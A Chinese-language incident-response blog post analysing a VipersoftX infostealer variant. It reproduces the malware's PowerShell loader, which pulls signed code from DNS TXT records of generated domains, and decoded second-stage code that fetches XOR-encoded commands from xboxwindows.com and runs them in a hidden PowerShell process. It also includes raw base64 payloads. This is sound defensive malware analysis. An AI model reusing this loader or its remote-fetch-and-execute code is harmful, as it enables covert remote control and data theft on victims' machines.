---
layout:       post
title:        "一次应急引发的VipersoftX窃密木马变种分析"
subtitle:     "VipersoftX窃密木马变种技战法分析"
author:      "Ga0weI"
header-style: text
catalog:      true
tags:
    - 窃密木马
    - 应急
 
---
# 0x01 背景

前两周处理一个应急的时候发现的一个VipersoftX变种，并且整个分析过程还算闭环，所以记录下；

# 0x02 分析过程：

通过外联域名bideo-schnellvpn，初步判断是VenomSoftX窃密木马活动事件，并且受害机器在ids设备上触发了大量普通远控木马和窃密木马事件，大概率存在样本；

安装sysmon 收集日志；

通过sysmon日志 找到外联进程及相关信息；

![image-20240515145606841](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240515145606841.png)



## 一、往后排查确认受影响相关：

定位进程参数：

![image-20240515145636352](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240515145636352.png)

拿到恶意脚本：

![image-20240511110201758](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511110201758.png)

分析脚本，获取指定注册表键值执行：《HKEY_LOCAL_MACHINE\SOFTWARE\SolidWorks CorporationJQVQJ\c8dO7TYiv》

![image-20240511110308539](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511110308539.png)

内容如下：

![image-20240511110749003](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511110749003.png)



提取分析：

```powershell
'EF616CBA-13C3-48EF-82CF-E7523A6A628F';
$ms = [IO.MemoryStream]::new();

function Get-Updates {
    param (
        $hostname
    )
    try {
        $dns = Resolve-DnsName -Name $hostname -Type 'TXT' 
        $ms.SetLength(0);
        $ms.Position = 0;
        foreach ($txt in $dns) {
            try {
                if ($txt.Type -ne 'TXT') {
                    continue;
                }
                $pkt = [string]::Join('', $txt.Strings);
                if ($pkt[0] -eq '.') {
                    $dp = ([type]((([regex]::Matches('trevnoC','.','RightToLeft') | ForEach {$_.value}) -join ''))).GetMethods()[306].Invoke($null, @(($pkt.Substring(1).Replace('_', '+'))));
                    $ms.Position = [BitConverter]::ToUInt32($dp, 0);
                    $ms.Write($dp, 4, $dp.Length - 4);
                }
            }
            catch {
            }
        }

        if ($ms.Length -gt 136) {
            $ms.Position = 0;
            $sig = [byte[]]::new(128);
            $timestamp = [byte[]]::new(8);
            $buffer = [byte[]]::new($ms.Length - 136);
            $ms.Read($sig, 0, 128) | Out-Null;
            $ms.Read($timestamp, 0, 8) | Out-Null;
            $ms.Read($buffer, 0, $buffer.Length) | Out-Null;
            $pubkey = [Security.Cryptography.RSACryptoServiceProvider]::new();
	    [byte[]]$bytarr = 6,2,0,0,0,164,0,0,82,83,65,49,0,4,0,0,1,0,1,0,171,136,19,139,215,31,169,242,133,11,146,105,79,13,140,88,119,0,2,249,79,17,77,152,228,162,31,56,117,89,68,182,194,170,250,16,3,78,104,92,37,37,9,250,164,244,195,118,92,190,58,20,35,134,83,10,229,114,229,137,244,178,10,31,46,80,221,73,129,240,183,9,245,177,196,77,143,71,142,60,5,117,241,54,2,116,23,225,145,53,46,21,142,158,206,250,181,241,8,110,101,84,218,219,99,196,195,112,71,93,55,111,218,209,12,101,165,45,13,36,118,97,232,193,245,221,180,169
            $pubkey.ImportCspBlob($bytarr);
            if ($pubkey.VerifyData($buffer, [Security.Cryptography.CryptoConfig]::MapNameToOID('SHA256'), $sig)) {
                return @{
                    timestamp = ([System.BitConverter]::ToUInt64($timestamp, 0));
                    text      = ([Text.Encoding]::UTF8.GetString($buffer));
                };
            } 
        }
    }
    catch {
    }
    return $null;
}

while ($true) {
    try {
        $update = @{
            timestamp = 0;
            text      = '';            
        };
        foreach ($c in (@("com", "xyz"))) {
            foreach ($a in (@("wmail", "fairu", "bideo", "privatproxy", "ahoravideo"))) {
                foreach ($b in (@("endpoint", "blog", "chat", "cdn", "schnellvpn"))) {
                    try {
                        $h = "$a-$b.$c";
                        $r = Get-Updates $h
                        if ($null -ne $r) {
                            if ($r.timestamp -gt $update.timestamp) {
                                $update = $r;
                            }
                        }
                    }
                    catch {
                    }
                }
            }
        }

        if ($update.text) {
            $job = Start-Job -ScriptBlock ([scriptblock]::Create($update.text));
            $job | Wait-Job -Timeout 14400;
            $job | Stop-Job;
        }
    }
    catch {
    }
    Start-Sleep -Seconds 30;
}
```

上述代码大致逻辑从 dns请求解析一个a.b.c域名的txt记录，a:("endpoint", "blog", "chat", "cdn", "schnellvpn"),b:("wmail", "fairu", "bideo", "privatproxy", "ahoravideo"),c:("com", "xyz")

对获取的txt记录进行“解码” —>内置rsa公钥签名校验—>反射运行代码

如下是捕获的一次的txt记录：

 ```
 .AAAAAF2h8B8FKoLc38oeIg9JiF4tNC1u0p_41R4rzJRxwGx5yVJJVi7GcLZ4MaDf5Z8BZJaJq0EkKWnrDp2DwuXItSmk7qR63ZLM0gw5vUhcbFe4tPmn8VSc1fxDar3vZ_uMM/VlWxDx3JXhdI79/aNR7XVvpGmW_zTJ0o3eQ3TmiXr/gbNapplb3AhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl0kc2hhID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUoKQ0KJG1hY2d1aWQgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAoKChbcmVnZXhdOjpNYXRjaGVzKCd5aHBhcmdvdHB5ckNcdGZvc29yY2lNXEVSQVdURk9TXDpNTEtIJywnLics;type: 16 .BAYAACAgICAgICAgJHAuU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJycpOyAgDQogICAgICAgICAgICAkcC5XYWl0Rm9yRXhpdCgpOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0gDQogICAgfSANCiAgICBjYXRjaCB7DQogICAgfSANCiAgICBTdGFydC1TbGVlcCAyDQp9DQo=;type: 16 .aAIAAGlkKSkgfCBGb3JFYWNoLU9iamVjdCBUb1N0cmluZyBYMikgLWpvaW4gJyc7DQp3aGlsZSAoJHRydWUpIHsgDQogICAgdHJ5IHsgDQogICAgICAgICRyID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAiaHR0cDovL3hib3h3aW5kb3dzLmNvbS9hcGkvdjEvJCgkZ3VpZCkiDQogICAgICAgIGlmICgkciAtbmUgJycpIHsgDQogICAgICAgICAgICAkYnVmID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRyKTsNCiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGJ1Zi5MZW5ndGg7ICRpKyspIHsNCiAgICAgICAgICAgICAgICAkYnVm;type: 16 .nAMAAFskaV0gPSAkYnVmWyRpXSAtYnhvciAyMjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRsaW5lcyA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKCRidWYpLlNwbGl0KCJgcmBuIik7DQogICAgICAgICAgICAkcCA9IFtEaWFnbm9zdGljcy5Qcm9jZXNzXTo6bmV3KCk7DQogICAgICAgICAgICAkcC5TdGFydEluZm8uV2luZG93U3R5bGUgPSAnSGlkZGVuJzsNCiAgICAgICAgICAgICRwLlN0YXJ0SW5mby5GaWxlTmFtZSA9ICdwb3dlcnNoZWxsLmV4ZSc7DQogICAgICAgICAgICAkcC5TdGFydEluZm8uVXNlU2hlbGxFeGVj;type: 16 .0AQAAHV0ZSA9ICRmYWxzZTsNCiAgICAgICAgICAgICRwLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSAkdHJ1ZTsNCiAgICAgICAgICAgICRwLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gJHRydWU7DQogICAgICAgICAgICAkcC5TdGFydCgpOw0KICAgICAgICAgICAgJHAuQmVnaW5PdXRwdXRSZWFkTGluZSgpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGxpbmUgaW4gJGxpbmVzKSB7DQogICAgICAgICAgICAgICAgJHAuU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJGxpbmUpOyAgDQogICAgICAgICAgICB9DQogICAg;type: 16 .NAEAACdSaWdodFRvTGVmdCcpIHwgRm9yRWFjaCB7JF8udmFsdWV9KSAtam9pbiAnJykpIC1OYW1lIE1hY2hpbmVHdWlkKS5NYWNoaW5lR1VJRDsNCiR1c2VyaWQgPSAiJCgkZW52OlVTRVJET01BSU4pJCgkZW52OlVTRVJOQU1FKSQoJGVudjpQUk9DRVNTT1JfUkVWSVNJT04pJCgkZW52OlBST0NFU1NPUl9JREVOVElGSUVSKSQoJGVudjpQUk9DRVNTT1JfTEVWRUwpJCgkZW52Ok5VTUJFUl9PRl9QUk9DRVNTT1JTKSQoJG1hY2d1aWQpIjsNCiRndWlkID0gKCRzaGEuQ29tcHV0ZUhhc2goW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1c2Vy;
 ```

简单处理，去除.之后多条合并：

```
AAAAAF2h8B8FKoLc38oeIg9JiF4tNC1u0p_41R4rzJRxwGx5yVJJVi7GcLZ4MaDf5Z8BZJaJq0EkKWnrDp2DwuXItSmk7qR63ZLM0gw5vUhcbFe4tPmn8VSc1fxDar3vZ_uMM/VlWxDx3JXhdI79/aNR7XVvpGmW_zTJ0o3eQ3TmiXr/gbNapplb3AhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl0kc2hhID0gW1NlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUoKQ0KJG1hY2d1aWQgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAoKChbcmVnZXhdOjpNYXRjaGVzKCd5aHBhcmdvdHB5ckNcdGZvc29yY2lNXEVSQVdURk9TXDpNTEtIJywnLicsBAYAACAgICAgICAgJHAuU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJycpOyAgDQogICAgICAgICAgICAkcC5XYWl0Rm9yRXhpdCgpOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0gDQogICAgfSANCiAgICBjYXRjaCB7DQogICAgfSANCiAgICBTdGFydC1TbGVlcCAyDQp9DQo=aAIAAGlkKSkgfCBGb3JFYWNoLU9iamVjdCBUb1N0cmluZyBYMikgLWpvaW4gJyc7DQp3aGlsZSAoJHRydWUpIHsgDQogICAgdHJ5IHsgDQogICAgICAgICRyID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAiaHR0cDovL3hib3h3aW5kb3dzLmNvbS9hcGkvdjEvJCgkZ3VpZCkiDQogICAgICAgIGlmICgkciAtbmUgJycpIHsgDQogICAgICAgICAgICAkYnVmID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRyKTsNCiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGJ1Zi5MZW5ndGg7ICRpKyspIHsNCiAgICAgICAgICAgICAgICAkYnVmnAMAAFskaV0gPSAkYnVmWyRpXSAtYnhvciAyMjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRsaW5lcyA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKCRidWYpLlNwbGl0KCJgcmBuIik7DQogICAgICAgICAgICAkcCA9IFtEaWFnbm9zdGljcy5Qcm9jZXNzXTo6bmV3KCk7DQogICAgICAgICAgICAkcC5TdGFydEluZm8uV2luZG93U3R5bGUgPSAnSGlkZGVuJzsNCiAgICAgICAgICAgICRwLlN0YXJ0SW5mby5GaWxlTmFtZSA9ICdwb3dlcnNoZWxsLmV4ZSc7DQogICAgICAgICAgICAkcC5TdGFydEluZm8uVXNlU2hlbGxFeGVj0AQAAHV0ZSA9ICRmYWxzZTsNCiAgICAgICAgICAgICRwLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSAkdHJ1ZTsNCiAgICAgICAgICAgICRwLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gJHRydWU7DQogICAgICAgICAgICAkcC5TdGFydCgpOw0KICAgICAgICAgICAgJHAuQmVnaW5PdXRwdXRSZWFkTGluZSgpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGxpbmUgaW4gJGxpbmVzKSB7DQogICAgICAgICAgICAgICAgJHAuU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJGxpbmUpOyAgDQogICAgICAgICAgICB9DQogICAgNAEAACdSaWdodFRvTGVmdCcpIHwgRm9yRWFjaCB7JF8udmFsdWV9KSAtam9pbiAnJykpIC1OYW1lIE1hY2hpbmVHdWlkKS5NYWNoaW5lR1VJRDsNCiR1c2VyaWQgPSAiJCgkZW52OlVTRVJET01BSU4pJCgkZW52OlVTRVJOQU1FKSQoJGVudjpQUk9DRVNTT1JfUkVWSVNJT04pJCgkZW52OlBST0NFU1NPUl9JREVOVElGSUVSKSQoJGVudjpQUk9DRVNTT1JfTEVWRUwpJCgkZW52Ok5VTUJFUl9PRl9QUk9DRVNTT1JTKSQoJG1hY2d1aWQpIjsNCiRndWlkID0gKCRzaGEuQ29tcHV0ZUhhc2goW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1c2Vy
```



``_``替换成``+``,并且base64解码：如下图：

![image-20240511172123535](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511172123535.png)



取前128位，为签名数据，使用内置公钥解签名验证；

取128-136位，为时间戳

![image-20240511172346615](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511172346615.png)

签名：

```
000000005da1f01f052a82dcdfca1e220f49885e2d342d6ed29e35478af3251c701b1e725492558bb19c2d9e0c6837f967c05925a26ad0490a5a7ac3a760f0b9722d4a693ba91eb764b334830e6f52171b15ee2d3e69fc5527357f10daaf7bd9b8c33f5655b10f1dc95e1748efdfda351ed756fa46996cd3274a37790dd39a25
```

时间戳：

```
ebfe06cd6a9a656f
```

转换标准时间戳：``/10000000``

![image-20240511173016677](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511173016677.png)



![image-20240511173046159](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511173046159.png)



时间戳时间是：23年11月21日；



138之后的都是之后要执行的代码：

```
[Security.Cryptography.SHA256]$sha = [Security.Cryptography.SHA256]::Create()
$macguid = (Get-ItemProperty ((([regex]::Matches('yhpargotpyrC\tfosorciM\ERAWTFOS\:MLKH','.',....        $p.StandardInput.WriteLine('');  
            $p.WaitForExit();
            break;
        } 
    } 
    catch {
    } 
    Start-Sleep 2
}

$userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)";
$guid = ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($userid)) | ForEach-Object ToString X2) -join '';
while ($true) { 
    try { 
        $r = Invoke-RestMethod -Uri "http://xboxwindows.com/api/v1/$($guid)"
        if ($r -ne '') { 
            $buf = [Convert]::FromBase64String($r);
            for ($i = 0; $i -lt $buf.Length; $i++) {
                $buf....[$i] = $buf[$i] -bxor 22;
            }
            $lines = [Text.Encoding]::ASCII.GetString($buf).Split("`r`n");
            $p = [Diagnostics.Process]::new();
            $p.StartInfo.WindowStyle = 'Hidden';
            $p.StartInfo.FileName = 'powershell.exe';
            $p.StartInfo.UseShellExecÐ...ute = $false;
            $p.StartInfo.RedirectStandardInput = $true;
            $p.StartInfo.RedirectStandardOutput = $true;
            $p.Start();
            $p.BeginOutputReadLine();
            foreach ($line in $lines) {
                $p.StandardInput.WriteLine($line);  
            }
    4...'RightToLeft') | ForEach {$_.value}) -join '')) -Name MachineGuid).MachineGUID;
```



捕获的另一个：

![image-20240511173824216](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511173824216.png)

```
....[$i] = $buf[$i] -bxor 22;
            }
            $lines = [Text.Encoding]::ASCII.GetString($buf).Split("`r`n");
            $p = [Diagnostics.Process]::new();
            $p.StartInfo.WindowStyle = 'Hidden';
            $p.StartInfo.FileName = 'powershell.exe';
            $p.StartInfo.UseShellExech...id)) | ForEach-Object ToString X2) -join '';
while ($true) { 
    try { 
        $r = Invoke-RestMethod -Uri "http://xboxwindows.com/api/v1/$($guid)"
        if ($r -ne '') { 
            $buf = [Convert]::FromBase64String($r);
            for ($i = 0; $i -lt $buf.Length; $i++) {
                $buf4...'RightToLeft') | ForEach {$_.value}) -join '')) -Name MachineGuid).MachineGUID;
$userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)";
$guid = ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($user....        $p.StandardInput.WriteLine('');  
            $p.WaitForExit();
            break;
        } 
    } 
    catch {
    } 
    Start-Sleep 2
}
....]¡ð..*.ÜßÊ.".I.^-4-nÒ.¸Õ.+Ì.qÀlyÉRIV.Æp¶x1 ßå..d..«A$)ië...ÂåÈµ)¤î¤zÝ.ÌÒ.9½H\lW¸´ù§ñT.ÕüCj½ïgë.3õe[.ñÜ.át.ýý£Qíuo¤i.û4ÉÒ.ÞCtæ.zÿ.³Z¦.[Ü.[Security.Cryptography.SHA256]$sha = [Security.Cryptography.SHA256]::Create()
$macguid = (Get-ItemProperty ((([regex]::Matches('yhpargotpyrC\tfosorciM\ERAWTFOS\:MLKH','.',Ð...ute = $false;
            $p.StartInfo.RedirectStandardInput = $true;
            $p.StartInfo.RedirectStandardOutput = $true;
            $p.Start();
            $p.BeginOutputReadLine();
            foreach ($line in $lines) {
                $p.StandardInput.WriteLine($line);  
            }
    
```



如下图：只要当前时间戳大于那个23年11月的时间戳，开始一个进程运行上述对应的代码，每隔4个小时运行一次：

![image-20240511174144235](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511174144235.png)





参考捕获的第一txt记录，还原出来的二阶段代码逻辑：

获取相关环境变量和特定注册表值（``计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid``），生成一个guid，访问``http://xboxwindows.com/api/v1/$($guid)``拉取样本：

拉取之后xor 22解密使用powershell运行；

代码如下：

```
[Security.Cryptography.SHA256]$sha = [Security.Cryptography.SHA256]::Create()
$macguid = (Get-ItemProperty ((([regex]::Matches('yhpargotpyrC\tfosorciM\ERAWTFOS\:MLKH','.',....        $p.StandardInput.WriteLine('');  
            $p.WaitForExit();
            break;
        } 
    } 
    catch {
    } 
    Start-Sleep 2
}

$userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)";
$guid = ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($userid)) | ForEach-Object ToString X2) -join '';
while ($true) { 
    try { 
        $r = Invoke-RestMethod -Uri "http://xboxwindows.com/api/v1/$($guid)"
        if ($r -ne '') { 
            $buf = [Convert]::FromBase64String($r);
            for ($i = 0; $i -lt $buf.Length; $i++) {
                $buf[$i] = $buf[$i] -bxor 22;
            }
            $lines = [Text.Encoding]::ASCII.GetString($buf).Split("`r`n");
            $p = [Diagnostics.Process]::new();
            $p.StartInfo.WindowStyle = 'Hidden';
            $p.StartInfo.FileName = 'powershell.exe';
            $p.StartInfo.UseShellExecÐ...ute = $false;
            $p.StartInfo.RedirectStandardInput = $true;
            $p.StartInfo.RedirectStandardOutput = $true;
            $p.Start();
            $p.BeginOutputReadLine();
            foreach ($line in $lines) {
                $p.StandardInput.WriteLine($line);  
            }
    4...'RightToLeft') | ForEach {$_.value}) -join '')) -Name MachineGuid).MachineGUID;
```





获取一个userid：

```
/7C190B4B451B891DF4A0CE4E2C2FEB559756FD0DAC7199D50D8B32E54FBC3ABA
```



发起请求，提取响应：

![image-20240511183405508](/img/一次应急引发的VipersoftX窃密木马变种分析/image-20240511183405508.png)

```
TW50elluZEpaSE5uWTNObFlqWXJOakZNSkVBbVgxVXZmblZSZldCeWZGTmdXQ1JiYmxsQ1ZIOVlVVjhtV0VKUWYxbFNmVzVNVVU4bVQwSlVmRXhDUkhwYmUxdHZUSHRBZjFoQ1F5TlliRU1rVEh0SFlVeFJVSHhZYkZNaldVRkhKMXRSUnlKUGZGdHZURUpESmt4N1hIeGJKRkIvVDBWVWVYSmVSR0ZhYkZOalcwY21YWGRSTDJ4eVVubHhjMUZjWUhOZWNtWjBlMFJnY2lWYlkwOGtMMkpTUjJaOGRDUWpZMHhCV0NaM1FTOWpXWDlVWkV4QlFHRmFRVkJsZDA1TWVsSkhabjVQSkZoNmRWNUhZa3hCSTN4MEpFUm1kSHQxSUY5UmNpQjNUbGRZVlhoeFlreDdMMjl5SkZCdlRGRkFmVnBCVEdCMWZIbHhXMEpYYkZwOFV5ZGJSU0p1V0d4ZlkxdDhSMWhWZTFoN1drNWNmbk5DZVhGWlVuRnZXMEp5ZlV4Q1hIeE1lMThtV1ZGZklsdEZKM2wzSkhWWVZYaHhZa3g3TDI5eUpGQnZURkZBZlZwT1ZHOTBKVVJnV1g5VWVYSmVSR0ZTUjJaOFRIOG5KSGRPV0daeVVTOXZXWDlVSVY5NFdIeDNVVUJpVEVWZklGOTdmaVp5WGxkL2NFY21YWEpPV0hwMWZ5ZCtUQ1JBWTNKU2VYRjBRUzhnZDBGdVpVOUZMaWRhZkZkeFhWNXlablI3UkdCeUpWdHhkSGhIY1Z0Q1YyTmJVbVZ4Y2lSNlkxaDhSeUZmWG5Fa1dGSmxjWFY0VHlCYlFsOG5XbnhYWmw5UmNucFBKR0pnV214ZllWdENWMkZiUWxkdVgxRk1ablY3UUh0MEpYRmdXMEpmSjFwOFYxaFZlMUI4VHlSQVlYSlNlWEZ5VVVBaWNsVXZlWEpSSjJWYVVWQmhkVkZ1Wms4a1VDWjNRUzlqV2lWK2VYSlJKMlZkSlg1aWRGVnVmblZlVkdWM1FWaCtjbEY2WUhSL0x5SjBRV0VoZFVJbVlWcDhmV1YzUVNkK1RDUkRZRTlPVEdaTWYyNW1kRUZRZUV4Rkx5Vk1RVnhoV2xWNVlGMThZbTVHUWxkaldWY21YVTlCV0h4TVRsUW1Xa0Z1Zm5SN2NpZFBRWEo2V1g5VUlIZFZKM3gwZjI0Z2QxSmlia1pDVjJOWlZXNGdkMVVuSm5Kc1ltNUdRbGRqV0c5dUlIZFZKM2wzYkdKdVJrSlhZMWhGYm5wMGZ5Y25kV3hpYmtaQ1YyTmJiMjU2ZEh4aWJrWkNWMk5iY1NaZGNrNVVlSFY3VUgxTVJTZG1kSGhZZWs4bFFHOU1SU2R2VEU1UUoweE9XQ1oxYkhseFcwY21YVThrVDJKUEpDOWpkSHRBZkhKUmVtTk1ieWRtZFZKNWNWdENWMnhhZkZNblcwVWlibGhzWDJOYmZFZFlWWHRZZlhSL0oyVjBKQzloV1g5VWZIUlJMeWRNVVV4bFQwNWNlbEpIWm54TWZ5ZG1kVkZZWUhKQkl5WjFlSDBnWDFGK1pGSkhlVmhWY1Nzck1TMGJIREo3YzJKM1NXQnpaR1YvZVhnMkt6WXVMeVl2SWlNdUl5NHRHeHd5ZTNOaWQwbHhZMzl5TmlzMkp5WWpJQ0FrTFJzY01udHpZbmRKZTJOaWMyNDJLell4SUNRbGNIQjBKaVk3ZENad0l6c2lKaUF2TzNjdUxuUTdJbklnSnlSekxpWjFkQ2NrTVMwYkhESjdjMkozU1g5bU5pczJNU2NnSkRnbkl5NDRKeUV2T0Nja0pqRXRHeHd5ZTNOaWQwbCtlV1ZpTmlzMk1XNTBlVzVoZjNoeWVXRmxPSFY1ZXpFdEd4d2JIRFUxTlRVMU5UVTFOVFUxTlRVMU5UVTFOVFUxTlRVMU5UVTFOVFViSEJzY01uVmtjM2RpYzNKWWMyRTJLell5Y0hkNlpYTXRHeHd5ZTJOaWMyNDJLelpOUlc5bFluTjdPRUorWkhOM2NuOTRjVGhiWTJKemJrc3NMSGh6WVQ0eVltUmpjem8yTW50elluZEplMk5pYzI0Nk5rMWtjM0JMTW5Wa2MzZGljM0pZYzJFL0xSc2NmM0EyUGpKMVpITjNZbk55V0hOaE5qdHpaell5Y0hkNlpYTS9ObTBiSERZMk5qWkZZbmRrWWp0RmVuTnpaalk3UlhOMWVYaHlaVFlsSmlZdEd4dzJOalkyWkhOaVkyUjRMUnNjYXhzY0d4d3lTWDV6ZDNKelpHVTJLelpOUW5OdVlqaFRlSFY1Y245NGNVc3NMRmRGVlY5Zk9GRnpZa1ZpWkg5NGNUNCtUV0p2Wm5OTFBqNCtUV1J6Y1hOdVN5d3NXM2RpZFg1elpUNHhZbVJ6WUhoNVZURTZNVGd4T2pGRWYzRitZa0o1V25Od1lqRS9ObW8yVUhsa1UzZDFmalp0TWtrNFlIZDZZM05yUHpZN2ZIbC9lRFl4TVQ4L1B6aFJjMkpiYzJKK2VYSmxQajlOSlNZZ1N6aGZlR0I1ZlhNK01uaGplbm82TmxZK1BqSjdjMkozU1dSeloyTnpaV0kvUHo4L05qdGxabnAvWWpZMGRtUjJlRFFiSERKK1ltSm1TV1J6WjJOelpXSTJLelpXYldzdE5oc2NNbjVpWW1aSmZuTjNjbk5rWlRZck5sWnRheTBiSERKK1ltSm1TV1J6WjJOelpXSTRabmRpZmpZck5qNHlTWDV6ZDNKelpHVk5Ka3MyTzJWbWVuOWlOakUyTVQ5Tkowc3RHeHdiSEhCNVpEWStNbjgyS3pZbkxUWXlmelk3ZW1JMk1rbCtjM2R5YzJSbE9GcHplSEZpZmkwMk1uODlQVDgyYlJzY05qWTJOazFsWW1SL2VIRk5TMHN5ZmpZck5qSkpmbk4zY25Oa1pVMHlmMHMyTzJWbWVuOWlOakVzTmpFdEd4dzJOalkyZjNBMlBqSitPRnB6ZUhGaWZqWTdlbUkySkQ4MmJSc2NOalkyTmpZMk5qWjBaSE4zZlMwYkhEWTJOalpyR3h3Mk5qWTJNbjVpWW1aSmZuTjNjbk5rWlUweWZrMG1TMHMyS3pZeWZrMG5TeTBiSEdzYkhCc2NNbVZ6WldWL2VYZzJLelpXYldzdEd4d3laWE5sWlg5NWVEaC9jallyTmpzbkxSc2NNbVZ6WldWL2VYZzRZMlp5ZDJKek5pczJNbUprWTNNdEd4d2JIRmR5Y2p0Q2IyWnpOanRYWldWemUzUjZiMWgzZTNNMlJXOWxZbk43T0ZoellqaGVZbUptR3h3eWRYcC9jM2hpTmlzMlRVVnZaV0p6ZXpoWWMySTRYbUppWmpoZVltSm1WWHAvYzNoaVN5d3NlSE5oUGo4dEd4d3lkWHAvYzNoaU9FSi9lM041WTJJMkt6Wk5Rbjk3YzBWbWQzaExMQ3hRWkhsN1czOTRZMkp6WlQ0a1B5MGJIREoxZW45emVHSTRWSGRsYzFkeWNtUnpaV1UyS3paTlEyUi9TeXdzZUhOaFBqUitZbUptTERrNU1qNHllM05pZDBsK2VXVmlQelEvTFJzY0d4d2JISEJqZUhWaWYzbDROa0p6WldJN1EzaC9kWGx5Y3padEd4dzJOalkyWm5ka2QzczJQaHNjTmpZMk5qWTJOall5WldKa0d4dzJOalkyUHhzY05qWTJObkI1WkRZK01uODJLelltTFRZeWZ6WTdlbUkyTW1WaVpEaGFjM2h4WW40dE5qSi9QVDAvTm0wYkhEWTJOalkyTmpZMmYzQTJQakpsWW1STk1uOUxOanR4WWpZa0l5TS9ObTBiSERZMk5qWTJOalkyTmpZMk5tUnpZbU5rZURZeVltUmpjeTBiSERZMk5qWTJOalkyYXhzY05qWTJObXNiSERZMk5qWmtjMkpqWkhnMk1uQjNlbVZ6TFJzY2F4c2NHeHd5WlhOM1pIVitSbmRpZm1VMkt6WldQaHNjTmpZMk5qUXljM2hnTEVORlUwUkdSRmxRWDFwVFNsSnpaWDFpZVdZME9oc2NOalkyTmpReWMzaGdMRU5GVTBSR1JGbFFYMXBUU2xsNGMxSmtmMkJ6U2xKelpYMWllV1kwT2hzY05qWTJOajVOVTNoZ2YyUjVlSHR6ZUdKTExDeFJjMkpRZVhweWMyUkdkMkorUGpSU2MyVjlZbmxtTkQ4L09oc2NOalkyTmpReWMzaGdMRVpEVkZwZlZVcFNjMlY5WW5sbU5Eb2JIRFkyTmpZME1uTjRZQ3hYV2xwRFJWTkVSVVpFV1ZCZldsTktXMzkxWkhsbGVYQmlTa0YvZUhKNVlXVktSV0ozWkdJMlczTjRZMHBHWkhseFpIZDdaVFE2R3h3Mk5qWTJOREp6ZUdBc1YwWkdVbGRDVjBwYmYzVmtlV1Y1Y0dKS1FYOTRjbmxoWlVwRlluZGtZalpiYzNoalNrWmtlWEZrZDN0bE5Eb2JIRFkyTmpZME1uTjRZQ3hYUmtaU1YwSlhTbHQvZFdSNVpYbHdZa3BmZUdKelpIaHpZalpUYm1aNmVXUnpaRXBIWTM5MWZUWmFkMk40ZFg1S1EyVnpaRFpHZjNoNGMzSktRbmRsZlZSM1pEUWJIRDh0R3h3YkhESmxjM2RrZFg1VGVHSmtmM05sTmlzMlZqNGJIRFkyTmpaTlptVjFZMlZpZVh0NWRIeHpkV0pMVm0wYkhEWTJOalkyTmpZMlpIbDVZalkyTmpZck5qRXpkMlptY25kaWR6TXhHeHcyTmpZMk5qWTJObUozWkhGelltVTJLeHNjTmpZMk5qWTJOalpOWm1WMVkyVmllWHQ1ZEh4emRXSkxWbTBiSERZMk5qWTJOalkyTmpZMk5uaDNlM00yS3pZeFUyNTVjbU5sTzFjeEd4dzJOalkyTmpZMk5qWTJOalptZDJKK05pczJNVk51ZVhKalpURWJIRFkyTmpZMk5qWTJhem9iSERZMk5qWTJOalkyVFdabGRXTmxZbmw3ZVhSOGMzVmlTMVp0R3h3Mk5qWTJOalkyTmpZMk